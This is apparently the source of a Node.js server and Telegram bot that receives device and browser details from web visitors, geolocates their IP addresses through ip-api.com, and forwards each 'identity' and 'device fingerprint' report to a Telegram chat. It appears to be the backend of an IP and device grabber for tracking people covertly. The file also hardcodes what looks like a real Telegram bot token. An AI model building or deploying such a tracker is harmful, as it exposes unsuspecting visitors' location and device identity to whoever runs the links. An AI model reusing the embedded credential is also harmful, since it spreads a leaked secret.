const express = require("express");
const cors = require('cors');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');
const UAParser = require('ua-parser-js'); // ✨ The fix for "unorganized data"

// 🔐 CONFIGURATION
const BOT_TOKEN = "8377073485:AAG2selNlxyHeZ3_2wjMGdG_QshklCiTAyE";
const ADMIN_ID = 8175884349; // 👑 Authorized Admin
const HOST_URL = "https://botu-s3f9.onrender.com"; // Verify this matches your Render URL

const app = express();
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// 🛡️ SYSTEM STABILITY
process.on('unhandledRejection', (reason) => console.error('🚨 Rejection:', reason));
process.on('uncaughtException', (error) => console.error('🚨 Exception:', error));
bot.on("polling_error", (msg) => console.log("⚠️ Polling Error (Ignored)"));

// ⚙️ MIDDLEWARE
app.use(require('helmet')({ contentSecurityPolicy: false }));
app.use(cors());
app.use(require('morgan')('dev'));
app.use(bodyParser.json({ limit: '50mb' })); // Supports large payloads
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

app.set("view engine", "ejs");
app.use(express.static("public"));

// 💾 IN-MEMORY STORAGE
let sessions = {};

// ==================== 👑 ADMIN AUTHORIZATION HELPER ====================

const isAdmin = (msg) => {
    const userId = msg.from ? msg.from.id : msg.message.chat.id;
    return userId === ADMIN_ID;
};

// ==================== 🤖 PROFESSIONAL BOT COMMANDS ====================

// 1. Set Persistent Menu
bot.setMyCommands([
    { command: "/start", description: "Initialize System" },
    { command: "/admin", description: "Admin Dashboard (Auth Required)" },
    { command: "/status", description: "Server Health Check" }
]);

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    const welcomeMsg = `
🤖 *System Online v16.0*

👋 Welcome, ${msg.from.first_name}.
✅ *Status:* Operational
📡 *Server:* ${HOST_URL}

_Use the menu to navigate._
    `;

    bot.sendMessage(chatId, welcomeMsg, { parse_mode: "Markdown" });
});

// 2. Admin Dashboard (Restricted)
bot.onText(/\/admin/, (msg) => {
    const chatId = msg.chat.id;

    if (!isAdmin(msg)) {
        return bot.sendMessage(chatId, "⛔ *ACCESS DENIED*\n_This command is restricted to administrators._", { parse_mode: "Markdown" });
    }

    bot.sendMessage(chatId, "🔐 *Admin Control Panel*", {
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: [
                [{ text: "📊 View Stats", callback_data: "stats" }, { text: "👥 Active Sessions", callback_data: "sessions" }],
                [{ text: "🧹 Clear Data", callback_data: "clear" }, { text: "🔄 Restart Bot", callback_data: "restart" }]
            ]
        }
    });
});

// 3. Handle Button Clicks
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;

    // Security Check for Buttons
    if (chatId !== ADMIN_ID) {
        return bot.answerCallbackQuery(query.id, { text: "⛔ Unauthorized", show_alert: true });
    }

    if (data === "stats") {
        const uptime = Math.floor(process.uptime());
        const mem = process.memoryUsage().heapUsed / 1024 / 1024;
        
        await bot.editMessageText(`
📊 *LIVE SERVER STATISTICS*

⏱️ *Uptime:* ${uptime} seconds
💾 *Memory:* ${mem.toFixed(2)} MB
👥 *Total Sessions:* ${Object.keys(sessions).length}
⚡ *Node Version:* ${process.version}
        `, {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: "Markdown",
            reply_markup: { inline_keyboard: [[{ text: "🔙 Back", callback_data: "back_admin" }]] }
        });
    }

    if (data === "clear") {
        sessions = {};
        await bot.answerCallbackQuery(query.id, { text: "✅ All sessions cleared" });
        // Refresh view
        bot.deleteMessage(chatId, query.message.message_id);
        bot.sendMessage(chatId, "🗑️ Database flushed.");
    }

    if (data === "back_admin") {
        bot.editMessageText("🔐 *Admin Control Panel*", {
            chat_id: chatId,
            message_id: query.message.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📊 View Stats", callback_data: "stats" }, { text: "👥 Active Sessions", callback_data: "sessions" }],
                    [{ text: "🧹 Clear Data", callback_data: "clear" }]
                ]
            }
        });
    }
});

// ==================== 🌐 DATA PROCESSING ROUTES ====================

// 1. Receive Data Endpoint
app.post("/data", async (req, res) => {
    const { uid, rawData } = req.body; // rawData expects { ua: "...", screen: "...", etc }
    
    if (!sessions[uid]) {
        // If no session exists, we can log it generally or ignore
        // For this example, we notify Admin
        if(uid === 'test') sessions[uid] = { chatId: ADMIN_ID };
        else return res.json({ status: "error", message: "Session not found" });
    }

    const targetChatId = sessions[uid].chatId;

    // ✨ PROFESSIONAL PARSING (ua-parser-js)
    // This fixes the "Unorganized Data" issue
    const parser = new UAParser(rawData.userAgent || "");
    const result = parser.getResult();

    // Identify OS & Browser with precision
    const osName = result.os.name || "Unknown OS";
    const osVer = result.os.version || "";
    const browserName = result.browser.name || "Unknown Browser";
    const browserVer = result.browser.version || "";
    const deviceType = result.device.type ? result.device.type.toUpperCase() : "DESKTOP";
    const deviceVendor = result.device.vendor || "Generic";

    // Get IP Info (Server Side)
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    let location = "Unknown Location";
    try {
        const geo = await axios.get(`http://ip-api.com/json/${ip}`);
        if(geo.data.status === 'success') {
            location = `${geo.data.city}, ${geo.data.country} (${geo.data.isp})`;
        }
    } catch(e) { console.error("GeoIP Error"); }

    const report = `
📝 *DIAGNOSTIC REPORT RECEIVED*

👤 *IDENTITY*
• IP Address: \`${ip}\`
• Location: ${location}

💻 *DEVICE FINGERPRINT*
• Type: ${deviceType}
• Vendor: ${deviceVendor}
• OS: *${osName} ${osVer}*
• Browser: *${browserName} ${browserVer}*
• CPU Architecture: ${result.cpu.architecture || "Unknown"}

📊 *SYSTEM STATUS*
• Battery: ${rawData.battery || "N/A"}
• Screen: ${rawData.screen || "N/A"}
• Connection: ${rawData.connection || "N/A"}
• Language: ${rawData.language || "en-US"}

_Report generated at ${new Date().toLocaleTimeString()}_
    `;

    bot.sendMessage(targetChatId, report, { parse_mode: "Markdown" });
    res.json({ status: "success" });
});

// 2. Keep-Alive Endpoint
app.get("/keepalive", (req, res) => {
    res.json({ status: "Online", uptime: process.uptime() });
});

// Self-Ping Loop (Keeps Render Awake)
setInterval(() => {
    axios.get(`${HOST_URL}/keepalive`).catch(() => {});
}, 45000); // Every 45 seconds

// ==================== 🚀 START SERVER ====================
const PORT = process.env.PORT || 10000;
app.listen(PORT, () => {
    console.log(`✅ Professional Server v16.0 Running on Port ${PORT}`);
    console.log(`👑 Admin ID Configured: ${ADMIN_ID}`);
});
